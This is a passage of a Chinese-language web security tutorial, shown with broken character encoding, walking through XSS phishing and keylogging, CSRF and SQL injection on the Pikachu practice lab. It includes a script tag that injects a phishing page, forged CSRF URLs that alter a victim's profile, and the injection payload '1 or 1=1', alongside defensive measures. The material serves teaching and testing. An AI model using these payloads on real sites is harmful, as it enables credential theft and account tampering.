![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe41fb37c84cf41c49532f87f16977cb0.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

æˆ‘ä»¬éœ€è¦è‡ªå·±æ­ä¸€ä¸ªæ¶æ„ç«™ç‚¹ï¼Œç„¶ååœ¨ç½‘ç«™ä¸Šæ”¾ä¸€ä¸ªpostè¡¨å•ï¼Œå°†å­˜æ”¾POSTè¡¨å•çš„é“¾æ¥å‘é€ç»™å—å®³è€…ï¼Œè¯±å¯¼å—å®³è€…ç‚¹å‡»ã€‚ è¿™ä¸ªPOSTè¡¨å•ä¼šè‡ªåŠ¨å‘æ¼æ´æœåŠ¡å™¨æäº¤ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œå®ç°å—å®³è€…å¸®æˆ‘ä»¬æäº¤POSTè¯·æ±‚çš„ç›®çš„ã€‚æˆ‘ä»¬åªéœ€è¦è¯±å¯¼å—å®³è€…ç‚¹å‡»ä¸Šé¢çš„é“¾æ¥å°±èƒ½çªƒå–ç”¨æˆ·çš„Cookieã€‚

#### 3.2.10XSSå±å®³-XSSè¿›è¡Œé’“é±¼çš„åŸç†å’Œæ¼”ç¤º

é’“é±¼æ€è·¯ï¼š-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F365a36f1b85e4915912f80427bd1d858.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

æ‰“å¼€xssé’“é±¼åå°ï¼Œæ‰“å¼€å­˜å‚¨å‹xssï¼Œè¾“å…¥`<script src="http://127.0.0.1/pikachu-master/pkxss/xfish/fish.php"></script>`ï¼Œé¡µé¢ä¼šå‡ºç°å¼¹çª—ï¼Œè¾“å…¥è´¦å·å¯†ç ã€‚å½“é¡µé¢åˆ·æ–°æ—¶ä¾ç„¶å­˜åœ¨å¼¹çª—ï¼Œæ‰€æœ‰è®¿é—®è€…éƒ½ä¼šé‡åˆ°å¼¹çª—ï¼Œè¾“å…¥è´¦å·å¯†ç åï¼Œæ•°æ®è¢«å­˜å…¥åå°ï¼Œæ‰“å¼€xssåå°å³å¯æŸ¥çœ‹é’“é±¼æ•°æ®ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F30afcb0f98dd467190e66854e1e09e70.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.11XSSå±å®³XSSè·å–é”®ç›˜è®°å½•åŸç†å’Œæ¼”ç¤º

**è·¨åŸŸï¼š**-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4eb4c510c45f4ac6beeb191b1a6fbab8.png)-
å½“åè®®ã€ä¸»æœº(ä¸»åŸŸåï¼Œå­åŸŸå)ã€ç«¯å£ä¸­çš„ä»»æ„ä¸€ä¸€ä¸ªä¸ç›¸åŒæ—¶ï¼Œç§°ä¸ºä¸åŒåŸŸã€‚æˆ‘ä»¬æŠŠä¸åŒçš„åŸŸä¹‹é—´è¯·æ±‚æ•°æ®çš„æ“ä½œï¼Œæˆä¸ºè·¨åŸŸæ“ä½œã€‚-
**è·¨åŸŸåŒæºç­–ç•¥**-
äº†å®‰å…¨è€ƒè™‘ï¼Œæ‰€æœ‰çš„æµè§ˆå™¨éƒ½çº¦å®šäº†"åŒæºç­–ç•¥â€ï¼Œ åŒæºç­–ç•¥è§„å®šï¼Œä¸¤ä¸ªä¸åŒåŸŸåä¹‹é—´ä¸èƒ½ä½¿ç”¨JSè¿›è¡Œç›¸äº’æ“ä½œã€‚æ¯”å¦‚: x.comåŸŸåä¸‹çš„javascripå¹¶ä¸èƒ½æ“ä½œy.comåŸŸä¸‹çš„å¯¹è±¡ã€‚-
å¦‚æœæƒ³è¦è·¨åŸŸæ“ä½œ,åˆ™éœ€è¦ç®¡ç†å‘˜è¿›è¡Œç‰¹æ®Šçš„é…ç½®ã€‚-
æ¯”å¦‚é€šè¿‡: header( â€œAccess -Control Allow- Origin:x.comâ€ )æŒ‡å®šã€‚-
Tips:ä¸‹é¢è¿™äº›æ ‡ç­¾è·¨åŸŸåŠ è½½èµ„æº(èµ„æºç±»å‹æ˜¯æœ‰é™åˆ¶çš„)æ˜¯ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ã€‚

\`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbd73867d83944fb0aa5967e4448061b9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_15%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æäº¤ä¹‹åï¼Œè¿™æ®µjsä»£ç å°±è¢«åµŒå…¥åˆ°äº†é¡µé¢å½“ä¸­ã€‚æ‰“å¼€rkserverï¼Œè®¾ç½®ä¸€ä¸ªheaderï¼Œå…è®¸è·¨åŸŸè®¿é—®ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F48fc2599980b481994a5252ed06a05fd.png)-
æ‰“å¼€æ§åˆ¶å°ï¼Œåœ¨é¡µé¢ä¸Šéšæ„è¾“å…¥ï¼Œå¯ä»¥çœ‹åˆ°è¯·æ±‚ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fccda91ae30544aafa90b471692a36005.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åœ¨é¡µé¢ä¸Šï¼Œéšæ„è¿›è¡Œè¾“å…¥ã€‚åœ¨åå°æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°é”®ç›˜æ•²å‡»è¢«è®°å½•ã€‚

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F778aa1b29ccd443580a703a258c8f5bb.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.12XSSå¸¸è§é˜²èŒƒæªæ–½

æ€»çš„åŸåˆ™:è¾“å…¥åšè¿‡æ»¤,è¾“å‡ºåšè½¬ä¹‰-
è¿‡æ»¤:æ ¹æ®ä¸šåŠ¡éœ€æ±‚è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚è¾“å…¥ç‚¹è¦æ±‚è¾“å…¥æ‰‹æœºå·ï¼Œåˆ™åªå…è®¸è¾“å…¥æ‰‹æœºå·æ ¼å¼çš„æ•°å­—ã€‚-
è½¬ä¹‰:æ‰€æœ‰è¾“å‡ºåˆ°å‰ç«¯çš„æ•°æ®éƒ½æ ¹æ®è¾“å‡ºç‚¹è¿›è¡Œè½¬ä¹‰,æ¯”å¦‚è¾“å‡ºåˆ°htmlä¸­è¿›è¡Œhtm|å®ä½“è½¬ä¹‰,è¾“å…¥åˆ°JSé‡Œé¢çš„è¿›è¡Œjsè½¬ä¹‰ã€‚

## 3.3CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ æ¼æ´ï¼‰

#### 3.3.1CSRFæ¼æ´æ¦‚è¿°

Cross-site request forgeryç®€ç§°ä¸º"CSRF" ã€‚-
<span style="background:#ffff00">åœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚(è¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ ä¸ªé“¾æ¥)</span>-
ç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»ä¹Ÿå°±å®Œæˆäº†ã€‚-
æ‰€ä»¥CSRFæ”»å‡»ä¹Ÿè¢«ç§°ä¸ºä¸º<span style="background:#ffff00">" one click "æ”»å‡»</span>ã€‚-
ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œä¸¾ä¸ªæ —å­ç†è§£ä¸€ä¸‹![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6b82b7e297f2410ea6a5af26a7c3a851.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ­£å¸¸æƒ…å†µä¸‹ï¼Œlucyç™»å½•åï¼Œç¼–è¾‘å¥½ä¿®æ”¹çš„å†…å®¹ï¼Œç‚¹å‡»æäº¤å³å¯å®Œæˆä¸ªäººä¿¡æ¯çš„ä¿®æ”¹-
é“¾æ¥urlï¼šhttp://192.168.112.200/ant/vulnerabilities/csrf/csrfget/csrf\_ mem\_ edit.php?sex= å¥³&phonenum= 12345678922&add=åœ°çƒæ‘504å·&email=lucy@pi kaâ€™ chu.com&submit=submit-
è¿™ä¸ªæ—¶å€™å°ç™½æƒ³è¦ä¿®æ”¹lucyçš„ä¸ªäººä¿¡æ¯è¯¥æ€ä¹ˆåšï¼Ÿ-
é¦–å…ˆè¦æœ‰lucyçš„æƒé™ï¼-
å°ç™½å°†ä¿®æ”¹ä¸ªäººä¿¡æ¯çš„è¯·æ±‚ä¼ªé€ ï¼Œå¼•è¯±lucyåœ¨ç™»é™†çš„æƒ…å†µä¸‹ç‚¹å‡»ï¼Œæ”»å‡»å°±æˆåŠŸäº†ã€‚-
http://192.168.112.200/ant/vulnerbiltie./csrf/csrfget/csrf mem. edit.php?sex=å¥³&phonenum= 13856564455&add=ç«æ˜Ÿæ‘111å·&email=lucy@pikachu.com&tsubmit= submit-
**æ”»å‡»æˆåŠŸæ¡ä»¶ï¼š**

> æ¡ä»¶1 : xxxè´­ç‰©ç½‘ç«™æ²¡æœ‰å¯¹ä¸ªäººä¿¡æ¯ä¿®æ”¹çš„è¯·æ±‚è¿›è¡Œé˜²CSRFå¤„ç†ï¼Œå¯¼è‡´è¯¥è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ã€‚å› æ­¤,æˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ ,å…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ (æ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯)çš„æ“ä½œ(å¢åˆ æ”¹)æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ ã€‚

> æ¡ä»¶2 : lucyåœ¨ç™»å½•äº†åå°çš„æƒ…å†µä¸‹,ç‚¹å‡»äº†å°ç™½å‘é€çš„"åŸ‹ä¼"é“¾æ¥ã€‚å¦‚æœlucyä¸åœ¨ç™»å½•çŠ¶æ€ä¸‹,æˆ–è€…lucyæ›´æœ¬å°±æ²¡æœ‰ç‚¹å‡»è¿™ä¸ªé“¾æ¥,åˆ™æ”»å‡»ä¸ä¼šæˆåŠŸã€‚

csrfä¸xssçš„åŒºåˆ«-
å¦‚æœå°ç™½äº‹å…ˆåœ¨xxç½‘çš„é¦–é¡µå¦‚æœå‘ç°äº†ä¸€ä¸ªXSSæ¼æ´,åˆ™å°ç™½å¯èƒ½ä¼šè¿™æ ·åšï¼š-
1,æ¬ºéª—Iucyè®¿é—®åŸ‹ä¼äº†XSSè„šæœ¬(ç›—å–cookieçš„è„šæœ¬)çš„é¡µé¢;-
2,Iucyä¸­æ‹›ï¼Œå°ç™½ç›—å–åˆ°åˆ°ucyçš„cookie ;-
3,å°ç™½é¡ºåˆ©ç™»å½•åˆ°lucyçš„åå°,å°ç™½è‡ªå·±ä¿®æ”¹lucyçš„ç›¸å…³ä¿¡æ¯;

CSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»,æ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™,è€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™,ç„¶åå®æ–½ç ´åã€‚-
å¦‚ä½•ç¡®è®¤ä¸€ä¸ªwebç³»ç»Ÿå­˜åœ¨csrfæ¼æ´-
1ï¼Œå¯¹ç›®æ ‡ç½‘ç«™å¢åˆ æ”¹çš„åœ°æ–¹è¿›è¡Œæ ‡è®°,å¹¶è§‚å¯Ÿå…¶é€»è¾‘ï¼Œåˆ¤æ–­è¯·æ±‚æ˜¯å¦å¯ä»¥è¢«ä¼ªé€ -
â€“æ¯”å¦‚ä¿®æ”¹ç®¡ç†å‘˜è´¦å·æ—¶ ï¼Œå¹¶ä¸éœ€è¦éªŒè¯æ—§å¯†ç  ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€  ;-
â€“æ¯”å¦‚å¯¹äºæ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹å¹¶æ²¡æœ‰ä½¿ç”¨å®‰å…¨çš„tokenéªŒè¯ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ;-
2.ç¡®è®¤å‡­è¯çš„æœ‰æ•ˆæœŸ(è¿™ä¸ªé—®é¢˜ä¼šæé«˜CSRFè¢«åˆ©ç”¨çš„æ¦‚ç‡)-
â€”è™½ç„¶é€€å‡ºæˆ–è€…å…³é—­äº†æµè§ˆå™¨,ä½†cookieä»ç„¶æœ‰æ•ˆï¼Œæˆ–è€…sessionå¹¶æ²¡æœ‰åŠæ—¶è¿‡æœŸ,å¯¼è‡´CSRFæ”»å‡»å˜çš„ç®€å•

#### 3.3.2CSRF ( get/post )å®éªŒæ¼”ç¤ºå’Œè§£æ

**CSRFget**-
æˆ‘ä»¬å‡è®¾æˆ‘ä»¬æ˜¯Lucyï¼Œç™»é™†ç½‘ç«™ä¿®æ”¹ä¿¡æ¯ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe71837a173074f53a113603882e0f062.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbcb38822733f45c9b6045275d3525f47.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬ç‚¹å‡»ä¿®æ”¹ä¿¡æ¯å¹¶æäº¤ï¼Œä¿®æ”¹æˆåŠŸã€‚æˆ‘ä»¬æ‰“å¼€burpæŸ¥çœ‹æŠ“åˆ°çš„æ•°æ®åŒ…-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7e311a1317e2450896ca573b0c047360.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¿™æ˜¯æˆ‘ä»¬çš„è¯·æ±‚ï¼šGET/vul/csrf/csrfget/csrf\_get\_edit.phpsex=5&phonenum=54151&add=411&email=www&submit=submit-
æˆ‘ä»¬å¹¶æ²¡æœ‰çœ‹åˆ°CSRFçš„tokenï¼Œè¯´æ˜å¹¶æ²¡æœ‰é˜²CSRFçš„æªæ–½ã€‚-
ä¿®æ”¹getè¯·æ±‚ï¼Œå°†åœ°å€411ä¿®æ”¹ä¸ºshanxi

    http://127.0.0.1/pikachu-master/vul/csrf/csrfget/csrf_get_edit.phpsex=5&phonenum=54151&add=shanxi&email=www&submit=submit
    
        

ç°åœ¨åªéœ€è¦æŠŠè¿™ä¸ªè¯·æ±‚é€šè¿‡é‚®ä»¶æˆ–è€…ä¿¡æ¯å‘ç»™Lucyï¼ŒLucyè¿›è¡Œäº†è®¿é—®ã€‚åœ°å€è¢«æ›´å¼€ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F57d0b119509548d8b086a88276837ee9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
postå‹ï¼Œå› ä¸ºæ˜¯è¯·æ±‚ä½“ï¼Œä¸èƒ½åœ¨urlä¸­ï¼Œå’Œxsspostç±»ä¼¼éœ€è¦è‡ªå·±å¼„ä¸€ä¸ªç«™ç‚¹ï¼Œåšä¸€ä¸ªè¡¨å•ï¼Œè®©Lucyç‚¹æˆ‘ä»¬æ¶æ„ç«™ç‚¹è¡¨å•çš„urlï¼Œå‘é¡µé¢æäº¤postè¯·æ±‚ã€‚

#### 3.3.3Anti CSRF token

CSRFçš„ä¸»è¦é—®é¢˜æ˜¯æ•æ„Ÿæ“ä½œçš„é“¾æ¥å®¹æ˜“è¢«ä¼ªé€ ,é‚£ä¹ˆå¦‚ä½•è®©è¿™ä¸ªé“¾æ¥ä¸å®¹æ˜“è¢«ä¼ªé€ ?-
\-æ¯æ¬¡è¯·æ±‚,éƒ½å¢åŠ ä¸€ä¸ªéšæœºç (éœ€è¦å¤Ÿéšæœºï¼Œä¸å®¹æ˜“ä¼ªé€ )ï¼Œ åå°æ¯æ¬¡å¯¹è¿™ä¸ªéšæœºç è¿›è¡ŒéªŒè¯!-
Antä¸ŠCSRF ( token )é¡¹ç›®çš„tokenç”Ÿæˆä»£ç :

![](https://cubox.pro/c/ filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0641d31a6c1a4643a00b0faba42c5659.png)

#### 3.3.4å¸¸è§CSRFé˜²èŒƒæªæ–½

å¢åŠ tokenéªŒè¯(å¸¸ç”¨çš„åšæ³•) :-
1ï¼Œå¯¹å…³é”®æ“ä½œå¢åŠ tokenå‚æ•°ï¼Œtokenå€¼å¿…é¡»éšæœºï¼Œæ¯æ¬¡éƒ½ä¸ä¸€æ ·;-
å…³äºå®‰å…¨çš„ä¼šè¯ç®¡ç†(é¿å…ä¼šè¯è¢«åˆ©ç”¨) :-
1ï¼Œä¸è¦åœ¨å®¢æˆ·ç«¯ç«¯ä¿å­˜æ•æ„Ÿä¿¡æ¯(æ¯”å¦‚èº«ä»½è®¤è¯ä¿¡æ¯) ;-
2ï¼Œæµ‹è¯•ç›´æ¥å…³é—­ï¼Œé€€å‡ºæ—¶ï¼Œçš„ä¼šè¯è¿‡æœŸæœºåˆ¶;-
3ï¼Œè®¾ç½®ä¼šè¯è¿‡æœŸæœºåˆ¶ï¼Œæ¯”å¦‚15åˆ†é’Ÿå†…æ— æ“ä½œï¼Œåˆ™è‡ªåŠ¨ç™»å½•è¶…æ—¶;-
è®¿é—®æ§åˆ¶å®‰å…¨ç®¡ç†:-
1ï¼Œæ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹æ—¶éœ€è¦å¯¹èº«ä»½è¿›è¡ŒäºŒæ¬¡è®¤è¯ï¼Œæ¯”å¦‚ä¿®æ”¹è´¦å·æ—¶,éœ€è¦åˆ¤æ–­æ—§å¯†ç ;-
2ï¼Œæ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹ä½¿ç”¨postï¼Œè€Œä¸æ˜¯get ;-
3ï¼Œé€šè¿‡httpå¤´éƒ¨ä¸­çš„refereræ¥é™åˆ¶åŸé¡µé¢-
å¢åŠ éªŒè¯ç :-
ä¸€èˆ¬ç”¨åœ¨ç™»å½•(é˜²æš´åŠ›ç ´è§£) ,ä¹Ÿå¯ä»¥ç”¨åœ¨å…¶ä»–é‡è¦ä¿¡æ¯æ“ä½œçš„è¡¨å•ä¸­(éœ€è¦è€ƒè™‘å¯ç”¨æ€§)

## 3.4SQL-Injectï¼ˆSQLæ³¨å…¥æ¼æ´ï¼‰
#### 3.4.1SQL Injectæ¼æ´åŸç†æ¦‚è¿°

åœ¨owaspå‘å¸ƒçš„top 10æ¼æ´é‡Œé¢ï¼Œæ³¨å…¥æ¼æ´ä¸€ç›´æ˜¯å±å®³æ’åç¬¬ä¸€ï¼Œå…¶ä¸­ä¸»è¦æŒ‡SQL Injectæ¼æ´ã€‚-
æ•°æ®åº“æ³¨å…¥æ¼æ´,ä¸»è¦æ˜¯å¼€å‘äººå‘˜åœ¨æ„å»ºä»£ç æ—¶,æ²¡æœ‰å¯¹==è¾“å…¥è¾¹ç•Œ==è¿›è¡Œå®‰å…¨è€ƒè™‘,å¯¼è‡´æ”»å‡»ç€å¯ä»¥é€šè¿‡åˆæ³•çš„è¾“å…¥ç‚¹æäº¤ä¸€äº›ç²¾å¿ƒæ„é€ çš„è¯­å¥ ,ä»è€Œæ¬ºéª—åå°æ•°æ®åº“å¯¹å…¶è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´æ•°æ®åº“==ä¿¡æ¯æ³„æ¼==çš„ä¸€ç§æ¼æ´ã€‚

> ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbc20edb526334474b6662299f0ef9d1b.png)-
> æ­£å¸¸è¾“å…¥ï¼š1 select email from users where id= 1;-
> éæ³•è¾“å…¥ï¼š1or1=1 select email from users where id= 1 or 1=1ï¼›

**SQL Inject æ¼æ´æ”»å‡»æµç¨‹**

1.  ç¬¬ä¸€æ­¥:æ³¨å…¥ç‚¹æ¢æµ‹-
    è‡ªåŠ¨æ–¹å¼:ä½¿ç”¨webæ¼æ´æ‰«æå·¥å…·ï¼Œè‡ªåŠ¨è¿›è¡Œæ³¨å…¥ç‚¹å‘ç°-
    æ‰‹åŠ¨æ–¹å¼:æ‰‹å·¥æ„é€ sq| injectæµ‹è¯•è¯­å¥è¿›è¡Œæ³¨å…¥ç‚¹å‘ç°
2.  ç¬¬äºŒæ­¥:ä¿¡æ¯è·å–-
    é€šè¿‡æ³¨å…¥ç‚¹å–æœŸæœ›å¾—åˆ°çš„æ•°æ®ã€‚-
    1.ç¯å¢ƒä¿¡æ¯:æ•°æ®åº“ç±»å‹,æ•°æ®åº“ç‰ˆæœ¬,æ“ä½œç³»ç»Ÿç‰ˆæœ¬,ç”¨æˆ·ä¿¡æ¯ç­‰ã€‚-
    2.æ•°æ®åº“ä¿¡æ¯:æ•°æ®åº“åç§°,æ•°æ®åº“è¡¨ï¼Œè¡¨å­—æ®µ,å­—æ®µå†…å®¹(åŠ å¯†å†…å®¹ç ´è§£)
3.  ç¬¬ä¸‰æ­¥:è·å–æƒé™-
    è·å–æ“ä½œç³»ç»Ÿæƒé™:é€šè¿‡æ•°æ®åº“æ‰§è¡Œshell,ä¸Šä¼ æœ¨é©¬-
    å¸¸è§çš„æ³¨å…¥ç‚¹ç±»å‹ï¼š-
    æ•°å­—å‹

    user_ id= $id
    
        

å­—ç¬¦å‹

    user. id= '$id' 
    
        

æœç´¢å‹

    text LIKE '%{$_ GET['search']}%'"
    
        

#### 3.4.2æ³¨å…¥æ–¹å¼get&post&æœç´¢å‹&xxå‹

**pikachu- SQL-Inject- æ•°å­—å‹æ³¨å…¥**-
postå‹æ³¨å…¥æ¼”ç¤º-
ä¸‹æ‹‰æ¡†éšæ„ç‚¹å‡»ä¸€ä¸ªæ•°å­—-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1b628dd23ad9488e81dd83005ee9b1a2.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å‘ç°urlä¸­å¹¶æ²¡æœ‰ä¼ å‚ï¼Œæäº¤æ–¹å¼ä¸ºpostæ–¹å¼ã€‚-
å…ˆæµ‹è¯•è¿™ä¸ªè¾“å…¥ç‚¹æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚æ­£å¸¸é€»è¾‘æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªidï¼Œä¹‹åè¿”å›æ•°æ®ï¼Œåº”è¯¥æ˜¯åå°åœ¨æ•°æ®åº“ä¸­è¿›è¡Œäº†æŸ¥è¯¢ï¼Œè¿”å›äº†å§“åå’Œé‚®ç®±å¯ä»¥è®¤ä¸ºè¯­å¥æ˜¯

    select å­—æ®µ1ï¼Œå­—æ®µ2 from è¡¨å where id = 1
    
        

åç«¯æ¥æ”¶åº”è¯¥æ˜¯ï¼š`$id=$_POST['id']`ä¹‹åæŠŠæ¥æ”¶åˆ°çš„å‚æ•°ä¼ è¿›å»ã€‚-
æˆ‘ä»¬ç‚¹å‡»æ•°å­—1ï¼Œè¿›è¡ŒæŸ¥è¯¢ï¼Œä¹‹åæ‰“å¼€burpæŸ¥çœ‹æŠ“åŒ…ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F83b3a42a29ca4122a2c78ae1e2aca109.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é€‰ä¸­å‘é€åˆ°Repeaterï¼Œæˆ‘ä»¬åœ¨è¾“å…¥ç‚¹è¾“å…¥ä¸€æ®µpayloadï¼š1 or 1=1ï¼Œç‚¹å‡»æäº¤ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fac2a3f15e75f457e9351f79c751b1af9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç‚¹å‡»Renderï¼Œå¯ä»¥æŸ¥çœ‹è¿”å›ç•Œé¢ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F77def960ccb54597bb86b4d5b9b98c93.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_13%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç»“æœå°±æ˜¯å®ƒå°†æ‰€æœ‰çš„ç”¨æˆ·å’Œé‚®ç®±å…¨éƒ¨è¿”å›åœ¨é¡µé¢ä¸Šã€‚-
**pikachu- SQL-Inject- å­—ç¬¦å‹æ³¨å…¥**-
éšæ„è¾“å…¥ä¸€æ®µå­—ç¬¦ï¼Œç‚¹å‡»æäº¤æç¤ºç”¨æˆ·åä¸å­˜åœ¨ã€‚å‘ç°è¯·æ±‚åœ¨urlä¸­ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fff5b8a586e03474e827a094e656da3a5.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ­£å¸¸è¿”å›æ˜¯ä¸¤ä¸ªå­—æ®µï¼Œç”¨æˆ·åå’Œé‚®ç®±ã€‚æˆ‘ä»¬å¯ä»¥å¯¹åå°è¿è¡Œåšå‡ºçŒœæƒ³ã€‚

    select å­—æ®µ1ï¼Œå­—æ®µ2 from è¡¨å where username = '111';
    
        

åå°æ¥æ”¶ï¼š`$uname=$_GET['username']`-
